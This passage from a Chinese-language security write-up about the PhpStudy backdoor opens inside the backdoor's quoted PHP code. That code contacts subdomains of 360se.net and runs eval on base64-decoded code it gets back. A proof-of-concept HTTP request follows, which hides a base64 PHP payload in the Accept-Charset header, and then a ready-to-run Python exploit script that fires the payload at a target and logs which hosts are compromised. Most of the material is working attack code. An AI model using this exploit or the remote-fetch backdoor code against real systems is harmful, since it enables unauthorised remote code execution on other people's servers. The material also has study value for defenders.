&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">遍历端口表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result = tcpGet($i,$d.&quot;.360se.net&quot;,$p);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($result != &quot;err&quot;){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$b =true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ($b)break;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$info = explode(&quot;&lt;^&gt;&quot;,$result);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (count($info)==4){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (strpos($info[3],&quot;/*Onemore*/&quot;) !== false){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info[3] = str_replace(&quot;/*Onemore*/&quot;,&quot;&quot;,$info[3]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$n=true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@eval(base64_decode($info[3]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}while($n);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">POC</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">熟悉原理后可根据执行流程构造执行任意代码的</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /index.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding:gzip,deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Charset:cHJpbnRmKG1kNSgzMzMpKTs=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Payload</span><span class="cs9C1B1871">：</span><span class="cs9FB05234">printf(md5(333));</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回显特征：</span><span class="cs9FB05234">310dcbbf4cce62f762a2aaa148d556bd</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpstudy/Phpstudy%20%e5%90%8e%e9%97%a8%ef%bc%88%e9%9d%9e%e5%ae%98%e6%96%b9%e5%90%8e%e9%97%a8%ef%bc%81%ef%bc%81%ef%bc%81%ef%bc%89_files/image6.jpg" width="560" height="211" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">图</span><span class="cs8926E06">5</span><span class="cs9C1B1871">：</span><span class="cs8926E06">Payload</span><span class="cs9C1B1871">回显验证</span></p><h3 class="cs868C439D">
			<a name="exp"><span class="csD1E291E2">exp</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#-*- encoding:utf-8 -*-</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs7FFD2630">卿</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">博客</span><span class="cs9FB05234">:https://www.cnblogs.com/-qing-/</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import threading</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import queue</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">print(&quot;======Phpstudy Backdoor Exploit============\n&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;===========By &nbsp;Qing=================\n&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;=====Blog</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">https://www.cnblogs.com/-qing-/==\n&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = &quot;echo \&quot;qing\&quot;;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = base64.b64encode(payload.encode(&#39;utf-8&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = str(payload, &#39;utf-8&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;accept-charset&#39;: payload,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Accept-Encoding&#39;: &#39;gzip,deflate&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;Connection&#39;: &#39;close&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">def write_shell(url,headers):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url=url+&#39;/index.php&#39;, headers=headers, verify=False,timeout=30)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;qing&quot; in r.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (&#39;[ + ] BackDoor successful: &#39;+url+&#39;===============[ + ]\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with open(&#39;success.txt&#39;,&#39;a&#39;) as f:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(url+&#39;\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (&#39;[ - ] BackDoor failed: &#39;+url+&#39;[ - ]\n&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print (&#39;[ - ] Timeout: &#39;+url+&#39; [ - ]\n&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">url = &quot;http://xxx&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">write_shell(url=url,headers=headers)</span></p></body>
</html>
